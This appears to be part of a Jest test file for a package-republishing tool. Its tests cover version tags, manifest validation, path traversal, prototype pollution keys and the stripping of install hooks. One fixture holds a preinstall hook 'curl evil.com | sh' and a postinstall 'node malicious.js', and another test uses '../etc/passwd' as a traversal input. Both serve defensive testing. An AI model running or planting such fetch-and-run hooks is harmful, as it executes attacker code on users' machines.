      expect(checkVersionEntry(42)).toBe('corrupt');

      expect(checkVersionEntry({ 0: { status: 'ok' } })).toBe('valid');
    });
  });

  describe('depup prerelease tag detection', () => {
    it('should detect depup in composite prerelease identifiers', () => {
      const semverModule = { prerelease: (v) => v };

      const isDepupVersion = (prereleaseIds) => {
        if (!Array.isArray(prereleaseIds)) {
          return false;
        }
        return prereleaseIds.some(
          (id) =>
            id === 'depup' || (typeof id === 'string' && id.endsWith('-depup')),
        );
      };

      // Standard depup prerelease: 1.0.0-depup.0
      expect(isDepupVersion(['depup', 0])).toBe(true);

      // Composite from base prerelease: 5.0.0-beta.3-depup.0
      // semver parses as ['beta', '3-depup', 0]
      expect(isDepupVersion(['beta', '3-depup', 0])).toBe(true);

      // Pure prerelease (not depup): 5.0.0-beta.3
      expect(isDepupVersion(['beta', 3])).toBe(false);

      // Old .includes('depup') would fail on '3-depup'
      expect(['beta', '3-depup', 0]).not.toContain('depup');
    });
  });

  describe('depup manifest validation', () => {
    it('should reject incomplete manifests', () => {
      const validateManifest = (name, version) => {
        if (!name || !version) {
          return 'invalid';
        }
        return 'valid';
      };

      expect(validateManifest('express', '4.18.2')).toBe('valid');

      expect(validateManifest(false, '4.18.2')).toBe('invalid');

      expect(validateManifest('express', false)).toBe('invalid');

      expect(validateManifest(false, false)).toBe('invalid');
    });
  });

  describe('npm install --omit=dev replaces --production', () => {
    it('should use omit=dev not production flag', () => {
      const installMethods = [
        ['npm', ['install', '--omit=dev']],
        ['npm', ['install', '--omit=dev', '--legacy-peer-deps']],
        ['npm', ['install', '--omit=dev', '--force', '--ignore-scripts']],
      ];

      for (const [, arguments_] of installMethods) {
        expect(arguments_).not.toContain('--production');

        expect(arguments_).toContain('--omit=dev');
      }
    });
  });

  describe('heal repairIntegrityData repairs missing version field', () => {
    it('should synthesize version from key and revKey', () => {
      const data = {
        '1.0.0': {
          0: {
            status: 'published',
            timestamp: '2026-03-10T00:00:00.000Z',
          },
        },
      };

      // Simulate repairIntegrityData logic
      let repaired = false;
      for (const [key, versionData] of Object.entries(data)) {
        for (const [revKey, revisionData] of Object.entries(versionData)) {
          if (!revisionData.version) {
            revisionData.version = `${key}-depup.${revKey}`;
            repaired = true;
          }
        }
      }

      expect(repaired).toBe(true);
      expect(data['1.0.0'][0].version).toBe('1.0.0-depup.0');
    });
  });

  describe('security-approval NaN limit guard', () => {
    it('should not slice when limit is not a positive number', () => {
      const entries = [
        { packageName: 'a' },
        { packageName: 'b' },
        { packageName: 'c' },
      ];

      // NaN limit should skip slicing (show all)
      const nanLimit = Number.parseInt('abc', 10);
      let result = [...entries];
      if (nanLimit > 0) {
        result = result.slice(-nanLimit);
      }

      expect(result).toHaveLength(3);

      // Valid limit should slice
      const validLimit = Number.parseInt('2', 10);
      let result2 = [...entries];
      if (validLimit > 0) {
        result2 = result2.slice(-validLimit);
      }

      expect(result2).toHaveLength(2);
    });
  });

  describe('gitignore scoped package patterns', () => {
    it('should match scoped package rev directory paths', () => {
      const unscopedPattern = /^packages\/[^@][^/]*\/\d/u;
      const scopedPattern = /^packages\/@[^/]+\/[^/]+\/\d/u;

      // Unscoped package path
      expect(unscopedPattern.test('packages/express/1.0.0/rev-0/')).toBe(true);

      // Scoped package path -- unscoped pattern should NOT match
      expect(unscopedPattern.test('packages/@babel/core/1.0.0/rev-0/')).toBe(
        false,
      );

      // Scoped package path -- scoped pattern should match
      expect(scopedPattern.test('packages/@babel/core/1.0.0/rev-0/')).toBe(
        true,
      );
    });
  });

  describe('manifest path traversal prevention', () => {
    it('should detect path traversal in manifest names', () => {
      const packagesRoot = '/app/packages';

      // Uses path.join which resolves .. before checking prefix
      const validatePath = (packageName) => {
        const packageDirectory = path.join(packagesRoot, packageName);
        return packageDirectory.startsWith(`${packagesRoot}/`);
      };

      expect(validatePath('express')).toBe(true);
      expect(validatePath('@babel/core')).toBe(true);

      // Path traversal: path.join resolves ../etc/passwd to /app/etc/passwd
      expect(validatePath('../etc/passwd')).toBe(false);
    });

    it('should reject prototype pollution keys', () => {
      const reservedKeys = new Set(['__proto__', 'constructor', 'prototype']);

      expect(reservedKeys.has('__proto__')).toBe(true);
      expect(reservedKeys.has('constructor')).toBe(true);
      expect(reservedKeys.has('prototype')).toBe(true);
      expect(reservedKeys.has('1.0.0')).toBe(false);
      expect(reservedKeys.has('express')).toBe(false);
    });
  });

  describe('dependency version null guard', () => {
    it('should skip when latestVersion is undefined', () => {
      const process_ = (latestVersion) => {
        if (!latestVersion) {
          return 'skipped';
        }
        return 'updated';
      };

      expect(process_(false)).toBe('skipped');
      expect(process_('')).toBe('skipped');
      expect(process_('1.0.0')).toBe('updated');
    });
  });

  describe('determineRevision max without spread', () => {
    it('should find max revision without stack overflow risk', () => {
      // Simulates the loop-based Math.max approach (no spread)
      const findMax = (revs) => {
        let maxRev = 0;
        for (const rev of revs) {
          maxRev = Math.max(maxRev, rev);
        }
        return maxRev + 1;
      };

      expect(findMax([0, 1, 2])).toBe(3);
      expect(findMax([5, 1, 3])).toBe(6);
      expect(findMax([0])).toBe(1);
      expect(findMax([])).toBe(1);

      // Large array that would overflow Math.max(...arr)
      const largeArray = Array.from({ length: 100_000 }, (_, index) => index);

      expect(findMax(largeArray)).toBe(100_000);
    });
  });

  describe('isAlreadyPublishedError depth limit', () => {
    it('should not infinite loop on circular cause chains', () => {
      const walkChain = (error) => {
        let current = error;
        let depth = 0;
        while (current && depth < 10) {
          if (current.message?.includes('EPUBLISHCONFLICT')) {
            return true;
          }
          current = current.cause;
          depth++;
        }
        return false;
      };

      // Normal chain
      const deepError = { cause: { cause: { message: 'EPUBLISHCONFLICT' } } };

      expect(walkChain(deepError)).toBe(true);

      // Circular chain -- would infinite loop without depth limit
      const circular = { message: 'error' };
      circular.cause = circular;

      expect(walkChain(circular)).toBe(false);

      // Chain deeper than 10 -- should still return false
      let chain = { message: 'bottom' };
      for (let index = 0; index < 15; index++) {
        chain = { cause: chain, message: `level-${index}` };
      }

      expect(walkChain(chain)).toBe(false);
    });
  });

  describe('negative timeout guard', () => {
    it('should enforce minimum timeout of 1000ms', () => {
      const parseTimeout = (raw) =>
        Math.max(Number.parseInt(raw, 10) || 300_000, 1000);

      expect(parseTimeout('-5000')).toBe(1000);
      expect(parseTimeout('0')).toBe(300_000); // 0 || 300000
      expect(parseTimeout('500')).toBe(1000); // too low, clamped
      expect(parseTimeout('60000')).toBe(60_000);
      expect(parseTimeout('garbage')).toBe(300_000); // NaN || 300000
    });
  });

  describe('security-scan duplicate findings prevention', () => {
    it('should not double-push malware findings', () => {
      // Simulates performAdvancedMalwareChecks NOT mutating this.results
      const results = {
        malware: {
          details: ['ClamAV not available - using basic pattern analysis'],
          status: 'warning',
        },
      };

      // Method returns findings without mutating results
      const advancedFindings = ['Hidden file detected: .secret'];

      // Only the caller should push
      if (advancedFindings.length > 0) {
        results.malware.status = 'warning';
        results.malware.details.push(...advancedFindings);
      }

      // Should appear exactly once
      const hiddenFileCount = results.malware.details.filter((detail) =>
        detail.includes('.secret'),
      ).length;

      expect(hiddenFileCount).toBe(1);
    });
  });

  describe('cron-discover deterministic sharding', () => {
    it('should assign same packages to same shards when list is sorted', () => {
      const packages = ['zod', 'express', 'react', 'angular', 'vue'];

      // Without sorting -- order depends on array position
      const shard0Unsorted = packages.filter((_name, index) => index % 3 === 0);

      // With sorting -- deterministic regardless of insertion order
      const sorted = [...packages].toSorted((a, b) => a.localeCompare(b));
      const shard0Sorted = sorted.filter((_name, index) => index % 3 === 0);

      // Re-sort in different insertion order
      const reordered = ['vue', 'angular', 'zod', 'express', 'react'];
      const reSorted = [...reordered].toSorted((a, b) => a.localeCompare(b));
      const shard0ReSorted = reSorted.filter((_name, index) => index % 3 === 0);

      // Sorted shards must match regardless of insertion order
      expect(shard0Sorted).toStrictEqual(shard0ReSorted);

      // Unsorted shard assignment depends on array order
      expect(shard0Unsorted).not.toStrictEqual(shard0Sorted);
    });
  });

  describe('cron-sync generates readme after update', () => {
    it('should call generateReadme when update succeeds', () => {
      // Tracks whether readme generation was called
      let readmeCalled = false;
      const generateReadme = () => {
        readmeCalled = true;
      };

      // Simulates syncPackage flow
      const versionChanged = true;
      if (versionChanged) {
        generateReadme();
      }

      expect(readmeCalled).toBe(true);
    });
  });

  describe('updateIntegrityData non-object guard', () => {
    it('should default to empty object when integrity.json has non-object JSON', () => {
      const testCases = [null, 42, '"string"', true, [1, 2, 3]];

      for (const value of testCases) {
        const isValidObject =
          typeof value === 'object' && value !== null && !Array.isArray(value);

        expect(isValidObject).toBe(false);
      }

      // Valid object should pass
      const validObject = { '1.0.0': { 0: {} } };

      expect(
        typeof validObject === 'object' &&
          validObject !== null &&
          !Array.isArray(validObject),
      ).toBe(true);
    });
  });

  describe('finalizePackage error preservation', () => {
    it('should chain both errors when publish and finalize fail', async () => {
      const publishError = new Error('publish failed');
      const finalizeError = new Error('finalize failed');

      let caughtError;
      try {
        // Simulate the new pattern
        let publishError_;
        try {
          throw publishError;
        } catch (error) {
          publishError_ = error;
        }

        try {
          throw finalizeError;
        } catch (finError) {
          if (publishError_) {
            throw new Error(`Publish failed and finalization also failed`, {
              cause: finError,
            });
          }
          throw finError;
        }
      } catch (error) {
        caughtError = error;
      }

      // The thrown error should reference finalize as cause
      expect(caughtError.cause).toBe(finalizeError);

      // The message should mention publish
      expect(caughtError.message).toContain('Publish failed');
    });
  });

  describe('clamAV ENOENT graceful degradation', () => {
    it('should detect ENOENT as ClamAV not installed', () => {
      const enoentError = { code: 'ENOENT', status: null };
      const infectedError = { code: undefined, status: 1 };
      const otherError = { code: 'EPERM', status: 2 };

      expect(enoentError.code).toBe('ENOENT');
      expect(infectedError.code).not.toBe('ENOENT');
      expect(otherError.code).not.toBe('ENOENT');

      // status === 1 means infected
      expect(infectedError.status).toBe(1);
      expect(enoentError.status).not.toBe(1);
    });
  });

  describe('add-package trailing comma flexibility', () => {
    it('should parse entries with and without trailing comma', () => {
      const lines = [
        "    'express',",
        "    'lodash',",
        "    'zustand'", // No trailing comma (last entry)
      ];

      const parsed = lines
        .map((line) => line.trim())
        .filter(
          (line) =>
            line.startsWith("'") && (line.endsWith("',") || line.endsWith("'")),
        )
        .map((line) => {
          const end = line.endsWith("',") ? -2 : -1;
          return line.slice(1, end);
        });

      expect(parsed).toStrictEqual(['express', 'lodash', 'zustand']);
    });
  });

  describe('import.meta.filename entry point guard', () => {
    it('should use import.meta.filename not string comparison with URL', () => {
      // The old guard: import.meta.url === `file://${process.argv[1]}`
      // breaks when paths have spaces (URL-encoded %20 vs raw space)
      const pathWithSpaces = '/Users/my user/depup/scripts/depup.mjs';
      const urlEncoded = `file://${encodeURI(pathWithSpaces)}`;
      const rawConcat = `file://${pathWithSpaces}`;

      // URL encoding produces different string than raw path concat
      expect(urlEncoded).not.toBe(rawConcat);

      // import.meta.filename is the correct approach (Node.js 20.11+)
      // Available in runtime but not in Jest VM -- verify the concept
      expect(urlEncoded).toContain('%20');
      expect(rawConcat).not.toContain('%20');
    });
  });

  describe('version directory semver sorting', () => {
    it('should sort versions numerically not lexicographically', async () => {
      const versions = ['2.0.0', '10.0.0', '1.0.0', '3.0.0'];

      // Lexicographic sort puts 10 before 2
      const lexSorted = [...versions].toSorted();

      expect(lexSorted[0]).toBe('1.0.0');
      expect(lexSorted[1]).toBe('10.0.0'); // Wrong -- 10 before 2

      // Numeric-aware sort via semver.compare
      const { default: semver } = await import('semver');
      const semverSorted = [...versions].toSorted((a, b) =>
        semver.compare(a, b),
      );

      expect(semverSorted[0]).toBe('1.0.0');
      expect(semverSorted[1]).toBe('2.0.0');
      expect(semverSorted[2]).toBe('3.0.0');
      expect(semverSorted[3]).toBe('10.0.0');
    });
  });

  describe('optional chaining undefined comparison guard', () => {
    it('should not false-positive when semver.coerce returns null', async () => {
      // Simulates the security-scan.mjs pattern
      const cases = [
        { dep: '^18.0.0', expected: 18 },
        { dep: '*', expected: undefined },
        { dep: 'latest', expected: undefined },
        { dep: 'workspace:*', expected: undefined },
      ];

      const { default: semver } = await import('semver');

      for (const { dep, expected } of cases) {
        const major = semver.coerce(dep)?.major;

        expect(major).toBe(expected);
      }

      // The fix: guard against undefined before numeric comparison
      const unparseable = undefined;

      expect(unparseable).toBeUndefined();
    });
  });

  describe('preparePackageJson strips dangerous fields', () => {
    it('should remove publishConfig to prevent publishing to wrong registry', () => {
      const packageJson = {
        dependencies: { lodash: '^4.0.0' },
        name: 'express',
        private: true,
        publishConfig: { registry: 'https://private.registry.com' },
        version: '4.18.2',
      };

      // Simulate what preparePackageJson does
      delete packageJson.publishConfig;
      delete packageJson.private;

      expect(packageJson.publishConfig).toBeUndefined();
      expect(packageJson.private).toBeUndefined();
      expect(packageJson.dependencies).toBeDefined();
      expect(packageJson.name).toBe('express');
    });

    it('should remove dangerous lifecycle scripts', () => {
      const packageJson = {
        name: 'test-pkg',
        scripts: {
          build: 'tsc',
          postinstall: 'node malicious.js',
          preinstall: 'curl evil.com | sh',
          prepublishOnly: 'npm run build',
          start: 'node index.js',
          test: 'jest',
        },
        version: '1.0.0',
      };

      const dangerousScripts = [
        'preinstall',
        'install',
        'postinstall',
        'preuninstall',
        'postuninstall',
        'prepublish',
        'prepublishOnly',
        'prepare',
      ];
      for (const script of dangerousScripts) {
        delete packageJson.scripts[script];
      }

      // Dangerous scripts removed
      expect(packageJson.scripts.preinstall).toBeUndefined();
      expect(packageJson.scripts.postinstall).toBeUndefined();
      expect(packageJson.scripts.prepublishOnly).toBeUndefined();

      // Safe scripts preserved
      expect(packageJson.scripts.build).toBe('tsc');
      expect(packageJson.scripts.start).toBe('node index.js');
      expect(packageJson.scripts.test).toBe('jest');
    });
  });

  describe('security-approval checkStatus exit codes', () => {
    it('should distinguish approved from unapproved packages', () => {
      const checkApprovalStatus = (packageName, allowlist, pending) => {
        if (allowlist.includes(packageName)) {
          return { exitCode: 0, status: 'approved' };
        }
        if (pending[packageName]) {
          return { exitCode: 1, status: 'pending' };
        }
        return { exitCode: 1, status: 'not-approved' };
      };

      expect(
        checkApprovalStatus('lodash', ['lodash', 'express'], {}),
      ).toStrictEqual({ exitCode: 0, status: 'approved' });

      expect(checkApprovalStatus('malware-pkg', [], {})).toStrictEqual({
        exitCode: 1,
        status: 'not-approved',
      });

      expect(
        checkApprovalStatus('pending-pkg', [], {
          'pending-pkg': { requestedAt: '2026-01-01' },
        }),
      ).toStrictEqual({ exitCode: 1, status: 'pending' });
    });
  });

  describe('suspiciousFiles case-insensitive matching', () => {
    it('should match filenames regardless of case', () => {
      const suspiciousFiles = new Set([
        '.ds_store',
        'thumbs.db',
        'desktop.ini',
        'autorun.inf',
      ]);

      // All case variants should match when lowercased
      expect(suspiciousFiles.has('.DS_Store'.toLowerCase())).toBe(true);
      expect(suspiciousFiles.has('.ds_store'.toLowerCase())).toBe(true);
      expect(suspiciousFiles.has('Thumbs.db'.toLowerCase())).toBe(true);
      expect(suspiciousFiles.has('THUMBS.DB'.toLowerCase())).toBe(true);
      expect(suspiciousFiles.has('Desktop.ini'.toLowerCase())).toBe(true);

      // Non-suspicious files should not match
      expect(suspiciousFiles.has('package.json'.toLowerCase())).toBe(false);
      expect(suspiciousFiles.has('index.js'.toLowerCase())).toBe(false);
    });
  });

  describe('dependency conflict rule values used in comparison', () => {
    it('should use rule version ranges to check compatibility', async () => {
      const semverModule = await import('semver');
      const semver = semverModule.default || semverModule;

      // Test individual version checks directly (avoids nested loop depth)
      const checkConflict = (depSpec, requiredRange) => {
        const depVersion = semver.coerce(depSpec)?.version;
        return depVersion
          ? !semver.satisfies(depVersion, requiredRange)
          : false;
      };

      // webpack-cli@3.0.0 fails >= 4.0.0
      expect(checkConflict('^3.0.0', '>= 4.0.0')).toBe(true);

      // react-dom@18.0.0 satisfies >= 17.0.0 (no issue)
      expect(checkConflict('^18.0.0', '>= 17.0.0')).toBe(false);

      // webpack-cli@5.0.0 satisfies >= 4.0.0
      expect(checkConflict('^5.0.0', '>= 4.0.0')).toBe(false);

      // Unparseable spec
      expect(checkConflict('latest', '>= 1.0.0')).toBe(false);
    });
  });
});
